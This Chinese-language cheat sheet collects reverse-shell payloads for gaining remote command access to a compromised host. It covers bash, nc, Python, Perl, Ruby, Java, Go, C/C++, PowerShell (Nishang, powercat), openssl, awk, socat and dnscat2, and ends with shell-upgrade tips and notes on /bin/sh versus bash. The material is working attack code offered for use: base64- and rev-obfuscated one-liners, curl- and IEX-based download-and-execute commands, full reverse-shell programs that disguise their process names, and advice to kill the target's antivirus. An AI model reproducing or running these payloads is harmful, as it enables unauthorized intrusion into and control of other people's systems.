# 反弹shell汇总

注意有些反弹shell的方法或脚本只适用于Linux或者Windows，注意区分相关脚本的编写方式方法。

## bash

```
bash -i >& /dev/[tcp|udp]/[host]/[port] 0>&1
/bin/bash  -i > /dev/[tcp/udp]/[host]/[port] 0<&1 2>&1
```

base64版

```bash
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}'  //其中的base64字符是bash -i >& /dev/tcp/10.10.14.7/4444 0>&1的base64加密
```

还可以引申一波

```
基础的反弹指令
echo "bash -i >& /dev/tcp/192.168.43.47/4444 0>&1" | bash我们来给它混淆一下
先给它base64一下
ZWNobyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjQ3LzQ0NDQgMD4mMSIgfCBiYXNo然后反转一下
oNXYiBCfgISMm4DMgQDN0QzL3QjLzQjL4YTMuITOx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ就这样套一下，也可以再套一层
echo oNXYiBCfgISMm4DMgQDN0QzL3QjLzQjL4YTMuITOx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ | rev |base64 -d |bash套变量
s=`echo oNXYiBCfgISMm4DMgQDN0QzL3QjLzQjL4YTMuITOx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ | rev |base64 -d |bash`;$s后面还可以套层数这是一种基础的方法，还有很多变种可以
```

## curl

本质上来说还是bash反弹，只不过用curl去远程假造，在一些特定情况下可以用。先本地写一个sh文件，这里文件名名为5555.sh

```
bash -i >& /dev/tcp/10.10.16.17/5555 0>&1
```

然后使用curl去远程加载（提前本地开启http）

```
curl 10.10.16.17/5555.sh|bash
```

然后本地开启监听就能收到shell

## NatCat(nc)

 不同版本的nc不一定支持-e：

```
nc -e /bin/bash [host] [port]
```

```
/bin/bash | nc [host] [port]
```

```
mknod backpipe p && nc [host] [port] 0<backpipe | /bin/bash 1>backpipe
```

```
nc  [host] [输入port]  |  /bin/bash  |  nc [host] [输出port]
```

```
rm -f /tmp/p; mknod /tmp/p p && nc [host] [port] 0/tmp/
```

当nc版本问题时：

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [host] [port] >/tmp/f
```

## exec

```
exec 5<>/dev/tcp/[host]/[port];cat <&5 | while read line; do $line 2>&5 >&5; done
```

```bash
exec 2>&0 0<&196;exec 196<>/dev/tcp/[host]/[port]; bash <&196 >&196 2>&196
```

## powercat

[powercat](https://github.com/besimorhino/powercat)是netcat的powershell版本，功能免杀性都要比netcat好用的多。

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.9:8000/powercat.ps1');powercat -c 10.10.14.9 -p 4444 -e cmd"
```

## telnet

```
telnet [host] [输入port] | /bin/bash | telnet [host] [输出port]
```

```
rm -f /tmp/p; mknod /tmp/p p && telnet [host] [port] 0/tmp/p
```

nc不可用或者/dev/tcp不可用时:

```
mknod backpipe p && telnet [host] [port] 0<backpipe | /bin/bash 1>backpipe
```

## python

```
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

脚本：

```python
#!/usr/bin/python3
import  os
import pty
import socket
lhost = ""
lport = 4444
def main():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((lhost, lport))
   os.dup2(s.fileno(), 0)
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   os.putenv("HISTFILE", '/dev/null')
   pty.spawn("/bin/bash")
   #os.remove('/tmp/.t.py')
   s.close()
if __name__ == "__main__":
   main()
```

```
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('ip',port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```

```
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=ip LPORT=port
import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='))
上面那段的base64解码为：
import socket,struct
s=socket.socket(2,1)
s.connect(('192.168.90.1',1234))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(4096)
while len(d)!=l:
	d+=s.recv(4096)
exec(d,{'s':s})
```

python升级完美pty：

```
python3 -c 'import pty;pty.spawn("bash")'
```

## php

```
php -r 'exec("/bin/bash -i >& /dev/tcp/[host]/[port]");'
```

```
php -r '$sock=fsockopen("[host]",[port]);exec("/bin/bash -i <&3 >&3 2>&3");'
```

配合nc使用，其他的也一样:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [host] [port] >/tmp/f"); ?>
```

## perl

```perl
perl -e 'use Socket;$i="[host]";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

不依赖/bin/sh

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[host]:[port]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[host]:[port]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

完整perl反弹shell脚本：

```perl
#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '127.0.0.1';
my $port = 1234;

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any
        # source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
    cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

    if ($auth) {
        unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
            cgiprint("ERROR: Your client isn't authorised to view this page");
            cgiexit();
        }
    }
} elsif ($auth) {
    cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
    cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
    my $pid = fork();
    if ($pid) {
        cgiexit(0); # parent exits
    }

    setsid();
    chdir('/');
    umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
    cgiprint("Sent reverse shell to $ip:$port");
    cgiprintpage();
} else {
    cgiprint("Couldn't open reverse shell to $ip:$port: $!");
    cgiexit();
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/sh"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
    my $line = shift;
    $line .= "<p>\n";
    $global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
    cgiprintpage();
    exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
    print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}
```

## ruby

不常用：

```
ruby -rsocket -e'f=TCPSocket.open("[host]",[port]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

不依赖/bin/bash

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[host]","[port]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

适用Windows

```
ruby -rsocket -e 'c=TCPSocket.new("[host]","[port]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

完整ruby反弹shell脚本(MSF模块自带):

```ruby
#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "192.168.1.10" 
#Set the Remote Host Port
PORT = "6667"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end  
  end
rescue
  retry
end
```

## java

base64写法：

```
Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}");
```

```
Runtime r = Runtime.getRuntime();
Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/[host]/[port];cat <&5 | while read line; do $line 2>&5 >&5; done"});
p.waitFor();
```

**完整过程：**

- 编辑ReverseShell.java

  ```java
  public class ReverseShell {
      /**
      * @param args
      * @throws Exception 
      */
  public static void main(String[] args) throws Exception {
          // TODO Auto-generated method stub
          Runtime r = Runtime.getRuntime();
          String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/[host]/[port];cat <&5 | while read line; do $line 2>&5 >&5; done"};
          Process p = r.exec(cmd);
          p.waitFor();
      }
  }
  ```

- 编译执行

  ```
  javac ReverseShell,java
  java ReverseShell
  ```

- 得到shell

## go

```
有个工具：https://github.com/TheKingOfDuck/ReverseGoShell/
使用说明：https://blog.thekingofduck.com/post/ReverseGoShell/
```

脚本执行：

- 编写脚本

  ```go
  // filename: ReverseShell.go
  package main
  import (
      "net"       // requirement to establish a connection
      "os"        // requirement to call os.Exit()
      "os/exec"   // requirement to execute commands against the target system
  )
  func main() {
      // Connecting back to the attacker
      // If it fails, we exit the program
      conn, err := net.Dial("tcp", "192.168.0.23:2233")
      if err != nil {
          os.Exit(1)
      }
      // Creating a /bin/sh process
      cmd := exec.Command("/bin/sh")
      // Connecting stdin and stdout
      // to the opened connection
      cmd.Stdin = conn
      cmd.Stdout = conn
      cmd.Stderr = conn
      // Run the process
      cmd.Run()
  }
  ```

- 编译执行

```
$ go build ReverseShell.go
$ ./ReverseShell
```

- 得到shell

还有更为完整的版本，详情可以看：https://www.cnblogs.com/zhangb8042/articles/10795123.html

## gcc(c)

- 脚本（linux版本）

  ```c
  //filename:ReverseShell.c
  #include <stdio.h>
  #include <unistd.h>
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <signal.h>
  #include <dirent.h>
  #include <sys/stat.h>
  
  int tcp_port = 6666;
  char *ip = "192.168.17.129";
  
  void reverse_shell(){
          int fd;
          if ( fork() <= 0){
                  struct sockaddr_in addr;
                  addr.sin_family = AF_INET;
                  addr.sin_port = htons(tcp_port);
                  addr.sin_addr.s_addr = inet_addr(ip);
  
                  fd = socket(AF_INET, SOCK_STREAM, 0);
                  if ( connect(fd, (struct sockaddr*)&addr, sizeof(addr)) ){
                          exit(0);
                  }
  
                  dup2(fd, 0);
                  dup2(fd, 1);
                  dup2(fd, 2);
                  execve("/bin/bash", 0LL, 0LL);
          }
          return;
  }
  
  void main(int argc, char const *argv[])
  {
          reverse_shell();
          return 0;
  }
  ```

- kali开启监听：

  ```
  nc -lvvp 6666
  ```

- gcc编译：

  ```
  gcc ReverseShell.c -o ReverseShell
  ```

- 成功得到shell

## g++(c++)

此方法可能被杀，使用前先查看目标上是否有杀软，先给他把他妈的进程kill掉，tasklist，taskkill

```c++
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <synchapi.h>
using namespace std;

SOCKET Winsock;
WORD wVersionRequested;
WSADATA wsaData;
struct sockaddr_in hax; // 地址结构
char ip_addr[16] = "*.*.*.*"; // ip地址（或者主机名）
char port[6] = "8888";              // 端口
// 指定新进程主窗口的特性
STARTUPINFO ini_processo;

// 返回有关新进程及其主线程的信息
PROCESS_INFORMATION processo_info;

int __cdecl main(){   
    int err;
    while(1){
        err = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if(err != 0){
            printf("WSAStartup failed with error: %d\n", err);
            return 1;
        }
        Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        if(Winsock==INVALID_SOCKET){
            wprintf(L"WSASocket function failed with error = %d\n", WSAGetLastError() );
        }
        else{
            struct hostent *host; // 黑客主机信息
            host = gethostbyname(ip_addr);
            strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
            hax.sin_family = AF_INET;
            hax.sin_port = htons(atoi(port));
            hax.sin_addr.s_addr = inet_addr(ip_addr);
            memset(&hax.sin_zero, 0, 8);
            err = connect(Winsock, (struct sockaddr *)&hax, sizeof(struct sockaddr));
            if (err == SOCKET_ERROR) {
                wprintf(L"connect function failed with error: %ld\n", WSAGetLastError());
                return 1;
            }else{
                memset(&ini_processo, 0, sizeof(ini_processo)); //初始化结构体
                ini_processo.cb = sizeof(ini_processo);
                ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 重定向，隐藏窗口
                // 将标准输入、输出、错误重定向到socket句柄
                ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

                TCHAR cmd[255] = TEXT("cmd.exe");

                CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

                return 0;
            }
            err = closesocket((SOCKET)Winsock);
            if(err == SOCKET_ERROR){
                wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
                WSACleanup();
                return 1;
            }
            WSACleanup();
            return 0;
        }
        Sleep(30000); //休眠30s
    }
    return 0;
}
```

使用如下命令编译：

```css
g++ reverse_shell_win.cpp -static -lwsock32 -lws2_32 -o reverse_shell_win.exe
```

在攻击机上监听端口

```undefined
nc -lvp 8888
```

## openssl（加密反弹shell）

在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。不加密就跟裸奔一样。

1. 首先生成自签名证书，输入的时候默认回车即可：

   ```
   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
   ```

   -newkey rsa:2048选项声明了使用RAS算法生成2048位的私钥。
   -nodes选项表明我们不使用密码加密私钥。
   -keyout key.key:生成私钥
   -out cert.pem：生成pem证书

2. 服务端监听8888端口：

   ```
   openssl s_server -quiet -key key.pem -cert cert.pem -port 8888
   ```

3. Linux下使用mkfifo进行反弹shell(使用openssl单向认证)：

   ```
   mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect [host]:[port]> /tmp/s; rm /tmp/s
   ```

openssl单/双向认证参考：https://blog.csdn.net/go_home_look/article/details/107238103

windows不推荐使用此方法，建议直接写webshell。当然Windows下也是可以的，这里做个参考：

1. 服务端开启两个监听，从 ip:port1 获取命令发送给 cmd.exe执行，然后结果返回到 ip:port2。

   ```
   openssl s_server -quiet -key key.pem -cert cert.pem -port [port1]
   openssl s_server -quiet -key key.pem -cert cert.pem -port [port2]
   ```

2. 客户端执行

   ```
   openssl s_client -quiet -connect [host]:[port1] | cmd.exe | openssl s_client -quiet -connect [host]:[port2]
   ```

3. 在服务端的[port1]的窗口发送命令,然后服务端[port2]的窗口会收到执行结果

## lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

```lua
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('ip',port);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
```

## awk

 awk是一种处理文本文件的语言，是一种解释型的编程语言，可以使用awk来处理反弹的命令。

[什么是awk？](https://github.com/mylxsw/growing-up/blob/master/doc/三十分钟学会AWK.md)

```
监听端：
nc -nlvp 1231
```

```
被监听端：
cp /usr/bin/awk /home/a               
(复制一个awk，一般情况下黑客如果做这一步是为了防止被检测，这一步可以不用做，直接用awk执行也是可以的)
/home/a 'BEGIN{s="/inet/tcp/0/[host]/[port]"
（BEGIN语句块在程序开始的使用执行，它只执行一次，BEGIN是awk的关键字，这个地方这条和下一条语句是拆开的，也可以合并在一起执行，注意合在一起执行的话，这条语句后面要加分号，比如看下面gawk，我会合并执行）
for(;s|&getline c;close(c))while (c|getline)print|&s;close(s)}'
(与其他C系语言一样，awk也有for循环，getline命令表示让awk读取下一行内容，close()函数是内建函数)
```

## gawk

 gawk是GNU所做的awk，之后不断地更新迭代，gawk 包含 awk 的所有功能。

```
监听端：
nc -nlvp 1231
```

```
被监听端:
gawk 'BEGIN{s="/inet/tcp/0/[host]/[port]";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

## socat

#### tcp

接收端输入：

```shell
./socat TCP-LISTEN:ip -
```

发送端输入：

```shell
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ip:port
```

#### udp

```shell
socat udp-connect:攻击者ip:端口 exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &
```

## MSF

```
1.msconsole      管理生成的exp  管理反弹的shell  通过反弹的shell进行后渗透。。。。
2.msfvenom       制作木马
3.msfencode      对木马进行编码
4.Auxiliary      辅助模块
5.meterpreter    连接 
```

## Cobalt strike

这个就不用多说了

## Nishang反弹shell

[Nishang](https://github.com/samratashok/nishang )是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell

#### Reverse TCP Shell

- 攻击机：

```
nc -lvp [port]
```

- 目标机：

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [hots] -port [port]
```

或者将nishang下载到攻击者本地然后攻击者开一个http服务：

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('http://[host]/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [host] -port [port]
```

#### Reverse UDP Shell

- 攻击者开启监听：

  ```
  nc -lvup [port]
  ```

- 目标机：

  ```powershell
  powershell IEX (New-Object Net.WebClient).DownloadString('http://[host]/nishang/Shells/Invoke-PowerShellUdp.ps1');
  Invoke-PowerShellUdp -Reverse -IPAddress [host] -port [port]
  ```

#### Reverse ICMP Shell

需要利用[icmpsh_m.py](https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。

- 首先攻击端下载icmpsh_m.py文件

  ```
  icmpsh_m.py Usage：
  python icmpsh_m.py [Attacker IP] [Victim IP]
  ```

- 攻击者执行：

  ```
  sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包
  python icmpsh_m.py [Attacker IP] [Victim IP] #开启监听
  ```

- 目标机执行：

  ```powershell
  powershell IEX (New-Object Net.WebClient).DownloadString('http://[host]/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress [host]
  ```

## 自定义powershell函数反弹shell

- 攻击机：

  ```
  nc -lvp [port]
  ```

- 目标机：

  ```powershell
  powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('[host]',[port]);$stream = $client.GetStream();
  [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```

  或者保存为lltest_tcp.ps1文件

  ```powershell
  powershell IEX (New-Object Net.WebClient).DownloadString('http://[host]/lltest_tcp.ps1');Invoke-lltestTcp
  ```

  lltest_tcp.ps1 如下：

  ```powershell
  function Invoke-lltestTcp
  {
  $client = New-Object Net.Sockets.TCPClient('[host]',[port])
  $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
  {
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
  $sendback = (iex $data 2>&1 | Out-String )
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
  }
  $client.Close()
  }
  ```

## dnscat2 反弹DNS shell

[dnscat2](https://github.com/iagox86/dnscat2)是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(https://github.com/lukebaggett/dnscat2-powershell).

利用dnscat2 和 dnscat2-powershell实现反弹DNS shell:

- 

- 攻击机：

  ```
  ruby dnscat2.rb --dns "domain=lltest.com,host=192.168.159.129" --no-cache -e open
  ```

  -e open 不使用加密连接，默认使用加密
  ruby dnscat2.rb —help 查看帮助

- 目标机执行：

  ```powershell
  powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');Start-Dnscat2 -Domain lltest.com -DNSServer [host]
  ```

- 成功反弹shell后，攻击者：

  ```
  session -i 1 #进入到session 1
  shell #执行之后会新生成一个session 需要通过session -i 2 切换
  session -i 2
  ```

## 补充（[详情](https://www.anquanke.com/post/id/99793)）

还有一些比较玄学的东西，这里列举一波，可能有点老但是可能会有用，所以这里还是做一个小记录，以备不时之需要。

#### Empire 结合office反弹shell

[Empire](https://github.com/EmpireProject/Empire )基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell

#### 利用office OLE对象插入bat文件反弹shell

#### PowerSploit DLL注入反弹shell





^
# **实现交互式shell的几种方法**

假设一个情况：如果当前拿到shell之后，我们想要使用vim、su或者想要tab补全代码、ctrl c结束当前行代码、或者使用快捷键使用上一条命令，这个时候这个shell并不会对我们的操作进行响应，那么这个时候就需要升级shell成为交互式完美shell，使其跟我们常规命令行操作一样

## python pty

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

```python
python3 -c "__import__('subprocess').call(['/bin/bash'])"
```

但是当前情况还是不能补全代码，得用stty来进行优化，来转换成完美shell

在执行完python命令之后，按下Ctrl+z

```
Linux 中Ctrl + c/d/z 看着都差不多，但是还是有不一样的含义
Ctrl + c 强制中断程序的执行，进程终止
Ctrl + d 发送EOF信号，很多程序接到这个信号后会停止
Ctrl + z 将任务中止，其实就是将这个任务暂停
```

按下Ctrl+z之后，nc反弹的shell放入了后台，界面退回到了攻击主机原本的shell

- `echo $TERM` 获取 term值
- `stty -a` 获取 rows 和 columns 的值

- `stty raw -echo` 关闭输入回显
- `fg` 进入前台，就是把刚才中止的nc连接捡回来

- `reset`
- `export SHELL=bash`
- `export TERM=[前面获取的term值]`
- `stty [前面获取的rows和columns值]`

这一套在ios系统里面不起作用，但在kali当中时可以完全解决的。

## 升级nc为交互shell

老实话没有什么区别，就上面那样，一样的。

## 使用socat

[socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)是类Unix系统下的一个工具，可以看作是 nc 的加强版。我们可以使用socat来传递完整的带有tty的TCP连接。缺点也很明显，只能在linux下面运行。

攻击机：

```
# 首先安装
$ sudo apt install socat
# 执行
$ socat file:`tty`,raw,echo=0 tcp-listen:[port]
```

目标机：

```
# 把socat上传到目标机器上或者直接下载
$ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
# 运行
$ chmod +x /tmp/socat
$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[host]:[port]
```

这种方式基本和ssh类似，ctrl+C也不会直接断开。

## script获取pty

我们可以使用 Linux 系统下的 `script` 命令，在弹回来的 shell 下创建一个带有 tty 的 shell, 这样就可以勉强使用一下 `top` 和 `vim`

```
$ script /dev/null
```

如果不加 `/dev/null` 的话，会在当前路径下生成一个名字是 `typescript` 的文件，记录着在 script 生命周期里你执行的所有命令和结果。

demo:

```bash
C:\Users\
λ nc -lvvp 4444
listening on [any] 4444 ...
connect to [192.168.2.134] from DESKTOP-IBUUT6H.lan [192.168.2.134] 30567
ubuntu@ubuntu:~$ tty
tty
not a tty
ubuntu@ubuntu:~$ script /dev/null
script /dev/null
Script started, file is /dev/null
ubuntu@ubuntu:~$ tty
tty
/dev/pts/1
```



## 小知识点总结——关于Linux中#!/bin/bash和#!/bin/sh的区别

#### #!

`#!`:是一个特殊的表示符，其后，跟着解释此脚本的shell路径。

除第一行外，脚本中所有以“#”开头的行都是注释。

- `#!/bin/bash`或`#!/bin/sh`只能放在第一行，如果后面还有#!(只要不是在第一行)，那么只能看成是注释。

  > 运行之前需要设置sh的运行权限`chmod 777 *`

- 当source命令执行有问题时，bash继续执行下面命令。

- 系统默认的shell是bash。

- \#!后面的路径一定要正确，不正确会报错(这个文件不会运行,提示路径不存在)。

#### 区别

- /bin/sh指向dash,/bin/bash指向bash
- dash相当于bash的精简版(dash不能使用let、source 等命令)

> 有的文章上说,说是 `#!/bin/sh` 的脚本,出错之后不会继续运行,`#!/bin/bash`的脚本,出错之后会继续运行,我在Ubuntu上试了一下...`#!/bin/sh` 的脚本还是继续运行了;
>
> 若是想出错之后停止运行,在`#!`行之后添加一行`set -e`,这样出错之后脚本就会停止了

------

GNU/Linux操作系统中的**/bin/sh**本是**bash (Bourne-Again Shell)** 的符号链接，但鉴于**bash**过于复杂，有人把**bash**从NetBSD移植到Linux并更名为**dash (Debian Almquist Shell)**，并建议将**/bin/sh**指向它，以获得更快的脚本执行速度。Dash Shell 比Bash Shell小的多，符合POSIX标准。

Ubuntu继承了Debian，所以从**Ubuntu 6.10**开始默认是Dash Shell。

所以也就是在**Ubuntu中可以认为/bin/sh就是/bin/dash**, 如果打算使用bash, 可直接将/bin/sh软链接到/bin/bash.

```bash
root@b3fe92a89f30:/# ll -h /bin/sh /bin/bash
-rwxr-xr-x 4 root root 1.2M Feb 25 12:03 /bin/bash*
lrwxrwxrwx 1 root root    4 Jul 18  2019 /bin/sh -> dash*
```

应该说，**/bin/sh**与**/bin/bash**虽然大体上没什么区别，但仍存在不同的标准。标记为**#!/bin/sh**的脚本不应使用任何**POSIX**没有规定的特性 (如**let**等命令, 但**#!/bin/bash**可以)。Debian曾经采用**/bin/bash**更改**/bin/dash**，目的使用更少的磁盘空间、提供较少的功能、获取更快的速度。但是后来经过shell脚本测试存在运行问题。因为原先在**bash shell**下可以运行的shell script (shell 脚本)，在**/bin/sh**下还是会出现一些意想不到的问题，不是100%的兼用。

上面可以这样理解，使用**man sh**命令和**man bash**命令去观察，可以发现**sh**本身就是**dash**，也就更好的说明集成Debian系统之后的更改。

> 在Ubuntu上,/bin/sh类似/bin/bash的精简版,有不少功能不能用,Ubuntu默认是/bin/bash 